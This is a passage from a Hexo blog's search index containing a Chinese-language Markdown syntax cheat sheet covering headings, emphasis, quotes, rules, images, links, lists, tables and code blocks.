      <content type="html"><![CDATA[<h4 id="1-标题"><a href="#1-标题" class="headerlink" title="1. 标题"></a>1. 标题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">……</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><h4 id="2-字体"><a href="#2-字体" class="headerlink" title="2. 字体"></a>2. 字体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><h4 id="3-引用"><a href="#3-引用" class="headerlink" title="3. 引用"></a>3. 引用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><h4 id="4-分割线"><a href="#4-分割线" class="headerlink" title="4. 分割线"></a>4. 分割线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><h4 id="5-图片"><a href="#5-图片" class="headerlink" title="5. 图片"></a>5. 图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![图片alt](图片地址 “图片title”)</span><br></pre></td></tr></table></figure><p>安装<code>npm install hexo-asset-image --save</code>, 新加文章<code>hexo new</code></p><h4 id="6-超链接"><a href="#6-超链接" class="headerlink" title="6. 超链接"></a>6. 超链接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[超链接名]（超链接地址）</span><br><span class="line">[简书](http://jianshu.com)</span><br></pre></td></tr></table></figure><h4 id="7-无序列表"><a href="#7-无序列表" class="headerlink" title="7. 无序列表"></a>7. 无序列表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br></pre></td></tr></table></figure><p>列表嵌套: 上一级和下一级之间敲三个空格即可</p><h4 id="8-表格"><a href="#8-表格" class="headerlink" title="8. 表格"></a>8. 表格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br></pre></td></tr></table></figure><h4 id="9-代码"><a href="#9-代码" class="headerlink" title="9. 代码"></a>9. 代码</h4>`单行代码`<br>```<br>  多行代码…<br>  多行代码…<br>  `` `]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
